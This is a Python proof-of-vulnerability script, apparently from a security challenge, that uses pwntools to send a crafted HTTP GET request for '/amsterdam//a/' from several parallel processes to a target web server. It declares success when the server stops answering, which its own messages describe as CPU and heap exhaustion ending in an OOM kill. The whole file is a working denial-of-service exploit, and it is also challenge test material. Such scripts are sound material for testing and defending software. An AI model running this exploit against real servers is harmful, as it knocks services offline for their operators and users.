from itertools import count
import sys
import os
import signal
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
import multiprocessing
from pwn import *

NUM_OF_PROCESSES = 3

def handler(signum, frame):
    print('Process timeout.')
    exit(0)

def make_request(procnum):
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)
    print('Process #' + str(procnum))
    p = remote(HOST, PORT)
    data = 'GET /amsterdam//a/ HTTP/1.1\r\n'
    data += 'Host: ' + HOST + ':' + str(PORT) + '\r\n'
    data += 'Connection: keep-alive\r\n'
    data += 'Cache-Control: max-age=0\r\n'
    data += 'Upgrade-Insecure-Requests: 1\r\n'
    data += 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\n'
    data += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    data += 'Sec-GPC: 1\r\n'
    data += 'Accept-Encoding: gzip, deflate\r\n'
    data += 'Accept-Language: en-US,en;q=0.9\r\n\r\n'
    p.send(data)

    try:
        d = p.recv().decode('utf-8')
    except:
        p.close()
        return 0
    return 1



def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    print('Starting ' + str(NUM_OF_PROCESSES) + ' processes')
    pool = multiprocessing.Pool(processes = NUM_OF_PROCESSES)
    returnval = pool.map(make_request, range(NUM_OF_PROCESSES))

    for i in returnval:
        if i == 1:
            print("Server responded to request")
            print('[ERROR] POV Failed')
            exit(0)
    print('RESOURCE_EXHAUSTED=%CPU/HEAP')
    print('  Verify status of httpd via top or ps in the challenge.')
    print('  Process will be killed by OOM Killer when memory reaches 100%.')
    print('[SUCCESS] POV Succeeded')

if __name__ == '__main__':
    main()